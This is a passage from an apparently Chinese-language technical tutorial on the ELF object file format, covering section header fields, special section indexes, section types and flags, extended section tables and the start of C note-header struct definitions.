某些节(Section)的地址需要对齐。例如，如果一个节(Section)有一个doubleword类型的变量，那么系统必须保证整个节(Section)按双字对齐。也就是说，sh_addr%sh_addralign=0。目前它仅允许为0，以及2的正整数幂。0和1表示该节(Section)没有对齐约束。</li><li><strong><code>sh_entsize</code></strong>: 某些节(Section)中存在具有固定大小的表项的表，如符号表(Symbol Table)。对于这类节，该成员给出每个表项的字节大小。反之，此成员取值为0。</li></ul><h3 id="4-1-特殊的节头表索引-Special-Section-Indexes"><a href="#4-1-特殊的节头表索引-Special-Section-Indexes" class="headerlink" title="4.1 特殊的节头表索引(Special Section Indexes)"></a>4.1 特殊的节头表索引(Special Section Indexes)</h3><p>&emsp;&emsp;一些节头表索引被保留，目标文件(Object Files)将不会有这些特殊索引对应的节(Section)。</p><p>&emsp;&emsp;在索引大小受限的上下文中保留了一些节头表索引。例如，符号表(Symbol Table)条目的st_shndx成员以及ELF头(ELF Header)的e_shnum和e_shstrndx成员。在这种情况下，保留值不代表目标文件中的实际节(Section)。同样在这样的上下文中，溢出值指示实际的节索引将在其他地方，在更大的字段中找到[^6]。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 4-1：Special Section Indexes</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">SHN_UNDEF</td><td style="text-align:center">0</td><td style="text-align:left">标志未定义的，丢失的，不相关的或者其它没有意义的节引用。例如，与节号SHN_UNDEF相关的“defined”的符号就是一个未定义符号。</td></tr><tr><td style="text-align:left">SHN_LORESERVE</td><td style="text-align:center">0xFF00</td><td style="text-align:left">保留的索引值范围的下限。</td></tr><tr><td style="text-align:left">SHN_LOPROC</td><td style="text-align:center">0xFF00</td><td style="text-align:left">保留用于特定处理器语义索引值范围的下限。</td></tr><tr><td style="text-align:left">SHN_BEFORE</td><td style="text-align:center">0xFF00</td><td style="text-align:left">弃用。在其他节之前的节。与SHF_LINK_ORDER和SHF_ORDERED节标志一起提供初始节排序。</td></tr><tr><td style="text-align:left">SHN_AFTER</td><td style="text-align:center">0xFF01</td><td style="text-align:left">弃用。在其他节之后的节。与SHF_LINK_ORDER和SHF_ORDERED节标志一起提供最终节排序。</td></tr><tr><td style="text-align:left">SHN_AMD64_LCOMMON</td><td style="text-align:center">0xFF02</td><td style="text-align:left">x64专用通用块标签。这个标签类似于SHN_COMMON，但是提供了标识大型通用块的功能[^6]。</td></tr><tr><td style="text-align:left">SHN_HIPROC</td><td style="text-align:center">0xFF1F</td><td style="text-align:left">保留用于特定处理器语义索引值范围的上限。</td></tr><tr><td style="text-align:left">SHN_LOOS</td><td style="text-align:center">0xFF20</td><td style="text-align:left">保留用于特定操作系统语义索引值范围的下限。</td></tr><tr><td style="text-align:left">SHN_HIOS</td><td style="text-align:center">0xFF3F</td><td style="text-align:left">保留用于特定操作系统语义索引值范围的上限。</td></tr><tr><td style="text-align:left">SHN_ABS</td><td style="text-align:center">0xFFF1</td><td style="text-align:left">该值指定相关引用的绝对值。例如，相对于节号SHN_ABS定义的符号具有绝对值并且不受重定位的影响。</td></tr><tr><td style="text-align:left">SHN_COMMON</td><td style="text-align:center">0xFFF2</td><td style="text-align:left">相对于本节定义的符号是通用符号，例如FORTRAN COMMON或未分配的C外部变量。</td></tr><tr><td style="text-align:left">SHN_XINDEX</td><td style="text-align:center">0xFFFF</td><td style="text-align:left">一个溢出值，指示实际的节头索引太大而无法放入包含字段。索引在额外的表中(SHT_SYMTAB_SHNDX类型节)。</td></tr><tr><td style="text-align:left">SHN_HIRESERVE</td><td style="text-align:center">0xFFFF</td><td style="text-align:left">保留的索引值范围的上限。</td></tr></tbody></table><p>&emsp;&emsp;虽然0号索引被保留用于未定义值，但节头表(Section Header Table)仍然包含索引为0的项。也就是说，如果ELF头(ELF Header)的e_shnum为6，那么索引应该为0~5。更加详细的内容在后面会说明。</p><p>&emsp;&emsp;系统预留SHN_LORESERVE和SHN_HIRESERVE之间的索引值(含边界)，这些值不引用节头表(Section Header Table)。也就是说，节头表(Section Header Table)不包含保留索引值对应的条目。</p><p>&emsp;&emsp;正如之前所说，节头表索引为0(SHN_UNDEF)的节头存在，此索引标记的是未定义的节引用。此条目包含以下内容。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 4-2：Section Header Table Entry: Index 0</p><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">sh_name</td><td style="text-align:center">0</td><td style="text-align:left">无名称</td></tr><tr><td style="text-align:left">sh_type</td><td style="text-align:center">SHT_NULL</td><td style="text-align:left">没有关联的节(Section)</td></tr><tr><td style="text-align:left">sh_flags</td><td style="text-align:center">0</td><td style="text-align:left">无标志</td></tr><tr><td style="text-align:left">sh_addr</td><td style="text-align:center">0</td><td style="text-align:left">无进程映像中的虚拟地址</td></tr><tr><td style="text-align:left">sh_offset</td><td style="text-align:center">0</td><td style="text-align:left">无文件偏移</td></tr><tr><td style="text-align:left">sh_size</td><td style="text-align:center">0</td><td style="text-align:left">无大小</td></tr><tr><td style="text-align:left">sh_link</td><td style="text-align:center">SHN_UNDEF</td><td style="text-align:left">无链接信息</td></tr><tr><td style="text-align:left">sh_info</td><td style="text-align:center">0</td><td style="text-align:left">无附加信息</td></tr><tr><td style="text-align:left">sh_addralign</td><td style="text-align:center">0</td><td style="text-align:left">无对齐要求</td></tr><tr><td style="text-align:left">sh_entsize</td><td style="text-align:center">0</td><td style="text-align:left">不存在具有固定大小的表项的表</td></tr></tbody></table><h3 id="4-2-节类型-sh-type"><a href="#4-2-节类型-sh-type" class="headerlink" title="4.2 节类型(sh_type)"></a>4.2 节类型(sh_type)</h3><p>&emsp;&emsp;节头(Section Header)的sh_type成员指定了节的类型。节类型目前有下列可选范围，其中“SHT”是“Section Header Table”的简写。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 4-3：Section Types, sh_type</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">SHT_NULL</td><td style="text-align:center">0</td><td style="text-align:left">该值将节头(Section Header)标记为非活动的；它没有关联的节(Section)。节头(Section Header)的其他成员具有未定义的值。</td></tr><tr><td style="text-align:left">SHT_PROGBITS</td><td style="text-align:center">1</td><td style="text-align:left">该节(Section)包含由程序定义的信息，其格式和含义完全由程序确定。</td></tr><tr><td style="text-align:left">SHT_SYMTAB</td><td style="text-align:center">2</td><td style="text-align:left">该类型节(Section)包含一个符号表(SYMbol TABle)。目前目标文件对每种类型的节(Section)都只能包含一个，不过这个限制将来可能发生变化。一般，SHT_SYMTAB节(Section)为链接器提供符号，尽管也可用来实现动态链接。作为一个完整的符号表，它可能包含很多对动态链接而言不必要的符号。</td></tr><tr><td style="text-align:left">SHT_STRTAB</td><td style="text-align:center">3</td><td style="text-align:left">该类型节(Section)包含字符串表(STRing TABle)。</td></tr><tr><td style="text-align:left">SHT_RELA</td><td style="text-align:center">4</td><td style="text-align:left">该类型节(Section)包含显式指定加数(r_addend)的重定位项(RELocation entry with Addends)，例如，32位目标文件中的Elf32_Rela类型节。此外，目标文件可能拥有多个重定位节。</td></tr><tr><td style="text-align:left">SHT_HASH</td><td style="text-align:center">5</td><td style="text-align:left">该类型节(Section)包含一个符号哈希表(symbol HASH table)。标准Hash表(Standard Hash Table)(.hash)。</td></tr><tr><td style="text-align:left">SHT_DYNAMIC</td><td style="text-align:center">6</td><td style="text-align:left">该类型节(Section)包含用于动态链接的信息(DYNAMIC linking)。</td></tr><tr><td style="text-align:left">SHT_NOTE</td><td style="text-align:center">7</td><td style="text-align:left">该类型节(Section)包含以某种方式标记文件的信息(NOTE)。</td></tr><tr><td style="text-align:left">SHT_NOBITS</td><td style="text-align:center">8</td><td style="text-align:left">该类型节(Section)不占用文件的空间，其它方面和SHT_PROGBITS相似。尽管该类型节(Section)不包含任何字节，其对应的节头成员sh_offset中还是会包含概念性的文件偏移。</td></tr><tr><td style="text-align:left">SHT_REL</td><td style="text-align:center">9</td><td style="text-align:left">该类型节(Section)包含重定位项(RELocation entry without Addends)，不过并没有指定加数(r_addend)。例如，32位目标文件中的Elf32_rel类型。目标文件中可以拥有多个重定位节。</td></tr><tr><td style="text-align:left">SHT_SHLIB</td><td style="text-align:center">10</td><td style="text-align:left">该类型此节(Section)被保留，不过其语义尚未被定义。</td></tr><tr><td style="text-align:left">SHT_DYNSYM</td><td style="text-align:center">11</td><td style="text-align:left">目标文件也可以包含一个类型为SHT_DYNSYM的节(Section)，其中保存动态链接符号的一个最小集合，以节省空间。</td></tr><tr><td style="text-align:left">SHT_INIT_ARRAY</td><td style="text-align:center">14</td><td style="text-align:left">标识包含指向初始化函数的指针数组的节(Section)。数组中的每个函数指针都被视为具有void返回值的无参数函数[^6]。</td></tr><tr><td style="text-align:left">SHT_FINI_ARRAY</td><td style="text-align:center">15</td><td style="text-align:left">标识包含指向终止函数的指针数组的节(Section)。数组中的每个函数指针都被视为具有void返回值的无参数函数[^6]。</td></tr><tr><td style="text-align:left">SHT_PREINIT_ARRAY</td><td style="text-align:center">16</td><td style="text-align:left">标识包含指向在所有其他初始化函数之前调用的函数的指针数组的节(Section)。数组中的每个指针都被视为具有void返回值的无参数函数[^6]。</td></tr><tr><td style="text-align:left">SHT_GROUP</td><td style="text-align:center">17</td><td style="text-align:left">标识节组(Section Group)。节组(Section Group)标识一组相关的节(Section)，链接器必须将这些节(Section)视为一个单元。SHT_GROUP类型的节(Section)只能出现在可重定位的对象中[^6]。</td></tr><tr><td style="text-align:left">SHT_SYMTAB_SHNDX</td><td style="text-align:center">18</td><td style="text-align:left">标识包含与符号表(Symbol Table)关联的扩展节头表索引(Extended Section Indexes)的节。如果符号表(Symbol Table)引用的任何节头表索引(Section Header Table Indexes)包含溢出值SHN_XINDEX(0xFFFF)，则需要关联的SHT_SYMTAB_SHNDX条目。</td></tr><tr><td style="text-align:left">SHT_NUM</td><td style="text-align:center">19</td><td style="text-align:left">其值为定义的节类型数量，不同版本的Linux内核中，此值可能不同，因为可能会对已定义的节类型删除或者增加新的节类型。</td></tr><tr><td style="text-align:left">SHT_LOOS</td><td style="text-align:center">0x60000000</td><td style="text-align:left">此值为保留用于特定操作系统的节类型值的范围的下限。</td></tr><tr><td style="text-align:left">SHT_GNU_ATTRIBUTES</td><td style="text-align:center">0x6FFFFFF5</td><td style="text-align:left">对象属性。</td></tr><tr><td style="text-align:left">SHT_GNU_HASH</td><td style="text-align:center">0x6FFFFFF6</td><td style="text-align:left">GNU风格Hash表(.gnu.hash)。</td></tr><tr><td style="text-align:left">SHT_GNU_LIBLIST</td><td style="text-align:center">0x6FFFFFF7</td><td style="text-align:left">Prelink库列表。</td></tr><tr><td style="text-align:left">SHT_GNU_verdef</td><td style="text-align:center">0x6FFFFFFD</td><td style="text-align:left">版本定义节(.gnu.version_d)。</td></tr><tr><td style="text-align:left">SHT_GNU_verneed</td><td style="text-align:center">0x6FFFFFFE</td><td style="text-align:left">版本请求节(.gnu.version_r)。</td></tr><tr><td style="text-align:left">SHT_GNU_versym</td><td style="text-align:center">0x6FFFFFFF</td><td style="text-align:left">符号版本节(.gnu.version)。</td></tr><tr><td style="text-align:left">SHT_HIOS</td><td style="text-align:center">0x6FFFFFFF</td><td style="text-align:left">此值为保留用于特定操作系统的节类型值的范围的上限。</td></tr><tr><td style="text-align:left">SHT_LOPROC</td><td style="text-align:center">0x70000000</td><td style="text-align:left">此值为保留用于特定处理器的节类型值的范围的下限。</td></tr><tr><td style="text-align:left">SHT_HIPROC</td><td style="text-align:center">0x7FFFFFFF</td><td style="text-align:left">此值为保留用于特定处理器的节类型值的范围的上限。</td></tr><tr><td style="text-align:left">SHT_LOUSER</td><td style="text-align:center">0x80000000</td><td style="text-align:left">此值为保留用于应用程序的节类型值的范围的下限。</td></tr><tr><td style="text-align:left">SHT_HIUSER</td><td style="text-align:center">0x8FFFFFFF</td><td style="text-align:left">此值为保留用于应用程序的节类型值的范围的上限。SHT_LOUSER和SHT_HIUSER可以被应用程序使用，而不会与当前或将来系统定义的节类型冲突。</td></tr></tbody></table><h3 id="4-3-节标志-sh-flags-6"><a href="#4-3-节标志-sh-flags-6" class="headerlink" title="4.3 节标志(sh_flags)[^6]"></a>4.3 节标志(sh_flags)[^6]</h3><p>&emsp;&emsp;节头(Section Header)中sh_flags字段的每一个比特位都可以定义相应的标志信息，其定义了对应节的内容是否可以被修改、被执行等信息。如果sh_flags中的一个标志位被设置，则该位取值为1，未定义的位都为0。目前已定义标志位如下，其他值保留。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 4-4：Section Attribute Flags, sh_flags</p><table><thead><tr><th style="text-align:left">宏名称</th><th style="text-align:center">值</th></tr></thead><tbody><tr><td style="text-align:left">SHF_WRITE</td><td style="text-align:center">0x1</td></tr><tr><td style="text-align:left">SHF_ALLOC</td><td style="text-align:center">0x2</td></tr><tr><td style="text-align:left">SHF_EXECINSTR</td><td style="text-align:center">0x4</td></tr><tr><td style="text-align:left">SHF_MERGE</td><td style="text-align:center">0x10</td></tr><tr><td style="text-align:left">SHF_STRINGS</td><td style="text-align:center">0x20</td></tr><tr><td style="text-align:left">SHF_INFO_LINK</td><td style="text-align:center">0x40</td></tr><tr><td style="text-align:left">SHF_LINK_ORDER</td><td style="text-align:center">0x80</td></tr><tr><td style="text-align:left">SHF_OS_NONCONFORMING</td><td style="text-align:center">0x100</td></tr><tr><td style="text-align:left">SHF_GROUP</td><td style="text-align:center">0x200</td></tr><tr><td style="text-align:left">SHF_TLS</td><td style="text-align:center">0x400</td></tr><tr><td style="text-align:left">SHF_COMPRESSED</td><td style="text-align:center">0x800</td></tr><tr><td style="text-align:left">SHF_MASKOS</td><td style="text-align:center">0x0FF00000</td></tr><tr><td style="text-align:left">SHF_MASKPROC</td><td style="text-align:center">0xF0000000</td></tr><tr><td style="text-align:left">SHF_AMD64_LARGE</td><td style="text-align:center">0x10000000</td></tr><tr><td style="text-align:left">SHF_ORDERED</td><td style="text-align:center">0x40000000</td></tr><tr><td style="text-align:left">SHF_EXCLUDE</td><td style="text-align:center">0x80000000</td></tr></tbody></table><ul><li><strong><code>SHF_WRITE</code></strong>: 标识在进程执行期间可写的节(Section)。</li><li><strong><code>SHF_ALLOC</code></strong>: 标识在进程执行期间占用内存的节(Section)。某些控制节(Section)不驻留在目标文件的内存映像中。对于这些节(Section)，不设置此属性。</li><li><strong><code>SHF_EXECINSTR</code></strong>: 标识包含可执行机器指令的节(Section)。</li><li><strong><code>SHF_MERGE</code></strong>: 标识包含可以合并以消除重复的数据的节(Section)。除非还设置了SHF_STRINGS标志，否则该节(Section)中的数据元素具有统一的大小。每个元素的大小在节头(Section Header)的sh_entsize字段中指定。如果还设置了SHF_STRINGS标志，则数据元素由以Null结尾的字符串组成。每个字符的大小在节头(Section Header)的sh_entsize字段中指定。</li><li><strong><code>SHF_STRINGS</code></strong>: 标识由以Null结尾的字符串组成的节(Section)。每个字符的大小在节头(Section Header)的sh_entsize字段中指定。</li><li><strong><code>SHF_INFO_LINK</code></strong>: 该节头(Section Header)的sh_info字段包含一个节头表索引(Section Header Table Index)。</li><li><strong><code>SHF_LINK_ORDER</code></strong>: 本节(Section)为链接器添加了特殊的排序要求。这些要求适用于由本节头(Section Header)的sh_link字段标识的引用节。如果此节(Section)与输出文件中的其他节(Section)组合，则该节(Section)相对于这些节(Section)必须以相同的相对顺序出现，就像被引用节(Section)相对于与其组合的节(Section)出现一样。链接到的节(Section)必须是无序的，并且不能反过来指定SHF_LINK_ORDER或SHF_ORDERED。<br> &emsp;&emsp;此标志的典型用途是构建按地址顺序引用文本或数据节(Section)的表。<br> &emsp;&emsp;除了添加排序要求之外，SHF_LINK_ORDER还指示该节(Section)包含描述引用的节(Section)的元数据。当执行未使用的节消除时，链接器确保该节和引用的节被一起保留或丢弃。从SHF_LINK_ORDER节(Section)到其引用的节(Section)的重定位本身，并不表示使用了引用的节(Section)。<br> &emsp;&emsp;在没有sh_link排序信息的情况下，来自单个输入文件的节(Section)组合在输出文件的一个节(Section)中时，它们是连续的。这些节(Section)与输入文件中的节(Section)具有相同的相对顺序。来自多个输入文件的节(Section)以链接行顺序(link-line order)出现。</li></ul><blockquote><p>注意：特殊的sh_link值SHN_BEFORE和SHN_AFTER意味着排序后的节(Section)将分别排在排序集中所有其他节(Section)的前面或后面。如果有序集中的多个节(Section)具有这些特殊值之一，则保留输入文件链接行顺序。SHN_BEFORE和SHN_AFTER与使用扩展节索引的对象不兼容。他们已被弃用。</p></blockquote><ul><li><strong><code>SHF_OS_NONCONFORMING</code></strong>: 本节(Section)需要在标准链接规则之外进行特定于操作系统的特殊处理，以避免错误行为。如果此节(Section)具有sh_type值或包含了这些字段在特定操作系统范围内的sh_flags位，并且链接器无法识别这些值，则包含此节(Section)的目标文件将因错误而被拒绝。</li><li><strong><code>SHF_GROUP</code></strong>: 此节(Section)是节组(Section Group)的成员，可能是唯一的成员。该节(Section)必须由SHT_GROUP类型的节(Section)引用。 SHF_GROUP标志只能为包含在可重定位对象中的节(Section)设置。</li><li><strong><code>SHF_TLS</code></strong>: 此节(Section)包含线程本地存储(Thread-Local Storage)。进程内的每个线程都有该数据的不同实例。</li><li><strong><code>SHF_COMPRESSED</code></strong>: 标识包含压缩数据的节(Section)。SHF_COMPRESSED仅适用于不可分配的节(Section)，不能与SHF_ALLOC一起使用。此外，SHF_COMPRESSED不能应用于SHT_NOBITS类型的节。</li><li><strong><code>SHF_MASKOS</code></strong>: 此掩码中包含的所有位都保留用于特定操作系统的语义。</li><li><strong><code>SHF_MASKPROC</code></strong>: 此掩码中包含的所有位都保留用于特定处理器的语义。</li><li><strong><code>SHF_AMD64_LARGE</code></strong>: x64的默认编译模型仅提供32位偏移量(Displacements)。这种偏移量将节(Section)的大小和最终段(Segment)的大小限制为2GB。此属性标志标识可以容纳超过2GB的节(Section)。此标志允许链接使用不同代码模型的目标文件。<br> &emsp;&emsp;使用小代码模型的对象可以自由引用不包含 SHF_AMD64_LARGE属性标志的x64对象文件节(Section)。包含此标志的节(Section)只能由使用较大代码模型的对象引用。例如，x64中等代码模型对象可以引用包含此属性标志的节(Section)和不包含此属性标志的节(Section)中的数据。但是，x64小代码模型对象只能引用不包含此标志的节(Section)中的数据。</li><li><strong><code>SHF_ORDERED</code></strong>: SHF_ORDERED是SHF_LINK_ORDER提供的功能的旧版本，已被SHF_LINK_ORDER取代。不再支持SHF_ORDERED。</li></ul><blockquote><p>注意：特殊的sh_info值SHN_BEFORE和SHN_AFTER意味着排序后的节(Section)将分别排在排序集中所有其他节(Section)的前面或后面。如果有序集中的多个节(Section)具有这些特殊值之一，则保留输入文件链接行顺序。SHN_BEFORE和SHN_AFTER与使用扩展节索引的对象不兼容。他们已被弃用。</p></blockquote><ul><li><strong><code>SHF_EXCLUDE</code></strong>: 此节(Section)不包含在可执行文件或共享对象的链接输入中。如果还设置了SHF_ALLOC标志，或者该节(Section)存在重定位，则忽略此标志。</li></ul><h3 id="4-4-sh-link-amp-sh-info"><a href="#4-4-sh-link-amp-sh-info" class="headerlink" title="4.4 sh_link &amp; sh_info"></a>4.4 sh_link &amp; sh_info</h3><p>&emsp;&emsp;节头(Section Header)中的两个成员sh_link和sh_info包含特殊信息，具体取决于节类型。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 4-5：ELF sh_link and sh_info Interpretation</p><table><thead><tr><th style="text-align:left">sh_type</th><th style="text-align:left">sh_link</th><th style="text-align:left">sh_info</th></tr></thead><tbody><tr><td style="text-align:left">SHT_DYNAMIC</td><td style="text-align:left">与此节(Section)关联的字符串表(String Table)的节头表(Section Header Table)索引。</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">SHT_HASH</td><td style="text-align:left">与此节(Section)关联的符号表(Symbol Table)的节头表(Section Header Table)索引。</td><td style="text-align:left">0</td></tr><tr><td style="text-align:left">SHT_REL/SHT_RELA</td><td style="text-align:left">与此节(Section)关联的符号表(Symbol Table)的节头表(Section Header Table)索引。</td><td style="text-align:left">重定位应用到的节(Section)的节头表(Section Header Table)索引，否则为0。</td></tr><tr><td style="text-align:left">SHT_SYMTAB/SHT_DYNSYM</td><td style="text-align:left">与此节(Section)关联的字符串表(String Table)的节头表(Section Header Table)索引。</td><td style="text-align:left">最后一个本地符号(STB_LOCAL)的符号表(Symbol Table)索引加1。</td></tr><tr><td style="text-align:left">SHT_GROUP</td><td style="text-align:left">与此节(Section)关联的符号表(Symbol Table)的节头表(Section Header Table)索引。</td><td style="text-align:left">相关符号表(Symbol Table)中某一表项的符号表索引。指定符号表表项的名称为节组(Section Group)提供了签名(名称)。</td></tr><tr><td style="text-align:left">SHT_SYMTAB_SHNDX</td><td style="text-align:left">与此节(Section)关联的符号表(Symbol Table)的节头表(Section Header Table)索引。</td><td style="text-align:left">0</td></tr></tbody></table><h3 id="4-5-扩展的节头表-Extended-Section-Header-Table-6"><a href="#4-5-扩展的节头表-Extended-Section-Header-Table-6" class="headerlink" title="4.5 扩展的节头表(Extended Section Header Table)[^6]"></a>4.5 扩展的节头表(Extended Section Header Table)[^6]</h3><p>&emsp;&emsp;标准ELF数据结构可以表示的节(Section)数量有限制的。</p><p>&emsp;&emsp;ELF头(ELF Header)的e_shnum和e_shstrndx元素都被限制为能够表示65535个节(Section)。</p><p>&emsp;&emsp;此外，符号表(Symbol Table)条目可以使用st_shndx元素引用与其关联的节(Section)，该元素仅限于能够表示65279个节(Section)。尽管此元素的大小可以表示65535个节(Section)，但为特殊符号类型保留了一系列值，SHN_LORESERVE(0xFF00) - SHN_HIRESERVE(0xFFFF)。</p><p>&emsp;&emsp;为了允许ELF对象包含超过65279个节(Section)，提供了许多特殊定义和特殊节类型。由此生成的ELF对象被认为包含扩展节头(Extended Section Header)信息。</p><p>&emsp;&emsp;在标准ELF对象中，第一个节头(Section Header)是用0填充的。当节数超过ELF头(ELF Header)中相应数据(e_shnum)的大小时，第一个节头(Section Header)元素用于定义扩展ELF头属性。下表显示了这些值。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 4-6：Extended Section Header Table Entry: Index 0</p><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:center">值</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">sh_name</td><td style="text-align:center">0</td><td style="text-align:left">无名称</td></tr><tr><td style="text-align:left">sh_type</td><td style="text-align:center">SHT_NULL</td><td style="text-align:left">没有关联的节(Section)</td></tr><tr><td style="text-align:left">sh_flags</td><td style="text-align:center">0</td><td style="text-align:left">无标志</td></tr><tr><td style="text-align:left">sh_addr</td><td style="text-align:center">0</td><td style="text-align:left">无进程映像中的虚拟地址</td></tr><tr><td style="text-align:left">sh_offset</td><td style="text-align:center">0</td><td style="text-align:left">无文件偏移</td></tr><tr><td style="text-align:left">sh_size</td><td style="text-align:center">e_shnum</td><td style="text-align:left">节头表(Section Header Table)中的条目数</td></tr><tr><td style="text-align:left">sh_link</td><td style="text-align:center">e_shstrndx</td><td style="text-align:left">与节头字符串表(Section Header String Table)相关联的节头表(Section Header Table)条目的索引</td></tr><tr><td style="text-align:left">sh_info</td><td style="text-align:center">e_phnum</td><td style="text-align:left">程序头表(Program Header Table)中的条目数</td></tr><tr><td style="text-align:left">sh_addralign</td><td style="text-align:center">0</td><td style="text-align:left">无对齐要求</td></tr><tr><td style="text-align:left">sh_entsize</td><td style="text-align:center">0</td><td style="text-align:left">不存在具有固定大小的表项的表</td></tr></tbody></table><p>&emsp;&emsp;当使用这个节头0(Section Header 0)信息时，ELF头(ELF Header)的e_shnum元素应该设置为0，e_shstrndx元素应该设置为SHN_XINDEX(0xFFFF)。</p><p>&emsp;&emsp;SHT_SYMTAB_SHNDX节是一个Elf32_Word值数组。每个值与符号表(Symbol Table)条目一一对应，并以与符号表(Symbol Table)条目相同的顺序出现。这些值表示定义符号表(Symbol Table)条目的节头索引。只有当符号表(Symbol Table)条目的st_shndx字段包含溢出值SHN_XINDEX(0xFFFF)时，相应的 SHT_SYMTAB_SHNDX条目才保存实际的节头索引。否则，SHT_SYMTAB_SHNDX条目必须是SHN_UNDEF(0)。</p><p>&emsp;&emsp;如果一个ELF文件需要超过65534个程序头(Program Header)，则节头表(Section Header Table)的节头0的sh_info元素用于定义程序头(Program Header)的数量，ELF头(ELF Header)的e_phnum元素包含PN_XNUM(0xFFFF)。</p><h2 id="5-节-Sections"><a href="#5-节-Sections" class="headerlink" title="5 节(Sections)"></a>5 节(Sections)</h2><p>&emsp;&emsp;节(Sections)包含目标文件中除了ELF头、程序头表、节头表之外的所有信息。此外，目标文件的节(Sections)满足以下几个条件：</p><ul><li>目标文件中的每一个节(Sections)都只有一个对应的节头(Section Header)来描述它。但是，可能存在没有对应节(Section)的节头(Section Header)。</li><li>每个节(Sections)在目标文件中是连续的，但是大小可能为0。</li><li>任意两个节(Sections)不能重叠，即一个字节不能同时存在于两个节(Sections)中。</li><li>目标文件中可能会有闲置空间(Inactive Space)，各种头和节不一定会覆盖到目标文件中的所有字节，闲置区域的内容是未指定的。</li></ul><p>&emsp;&emsp;许多在ELF文件中的节(Section)都是预定义的，它们包含程序和控制信息。这些节(Section)被操作系统使用，但是对于不同的操作系统，同一节(Section)可能会有不同的类型以及属性。</p><p>&emsp;&emsp;可执行文件(Executable files)是由链接器将一些单独的目标文件以及库文件链接起来而得到的。其中，链接器会解析不同目标文件之间的引用(子例程的引用以及数据的引用)，调整目标文件中的绝对引用，并且重定位指令。加载与链接过程需要目标文件中的信息，并且会将处理后的信息存储在一些特定的节(Section)中，比如.dynamic。</p><p>&emsp;&emsp;每一种操作系统都会支持一组链接模型，但这些模型都大致可以分为两种:</p><ul><li><strong><code>静态链接(Static)</code></strong>: 静态链接的文件中所使用的库文件或者第三方库都被静态绑定了，其引用已经被解析了，是一个完全自包含的可执行文件。</li><li><strong><code>动态链接(Dynamic)</code></strong>: 动态链接的文件中所使用的库文件或者第三方库只是单纯地被链接到可执行文件中。当可执行文件执行的时候使用到相应的函数时，相应的函数地址才会被解析。加载此可执行文件时，必须在系统中提供其他共享资源和动态库，才能使程序成功运行。</li></ul><p>&emsp;&emsp;有一些特殊的节(Section)可以支持调试，比如说.debug以及.line节；支持程序控制的节有.bss，.data，.data1，.rodata，.rodata1。</p><p style="text-align:center;font-weight:bold;margin:-10px 0px">Table 5-1：</p><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">类型</th><th style="text-align:left">属性</th><th style="text-align:left">含义</th></tr></thead><tbody><tr><td style="text-align:left">.comment</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">.debug</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">.dynamic</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">.dynstr</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">.dynsym</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">.got</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">.line</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">.plt</td><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left"></td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><h3 id="5-1-Note-Related-Sections"><a href="#5-1-Note-Related-Sections" class="headerlink" title="5.1 Note Related Sections"></a>5.1 Note Related Sections</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word n_namesz;<span class="comment">/* Length of the note's name.  */</span></span><br><span class="line">    Elf32_Word n_descsz;<span class="comment">/* Length of the note's descriptor.  */</span></span><br><span class="line">    Elf32_Word n_type;    <span class="comment">/* Type of the note.  */</span></span><br><span class="line">&#125; Elf32_Nhdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Word n_namesz;<span class="comment">/* Length of the note's name.  */</span></span><br><span class="line">    Elf64_Word n_descsz;<span class="comment">/* Length of the note's descriptor.  */</span></span><br><span class="line">    Elf64_Word n_type;    <span class="comment">/* Type of the note.  */</span></span><br><span class="line">&#125; Elf64_Nhdr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------------------------------------------------------------------------------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Known names of notes. */</span></span><br><span class="line"><span class="comment">/* 已知的注释名称. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Solaris entries in the note section have this name.</span></span><br><span class="line"><span class="comment">// 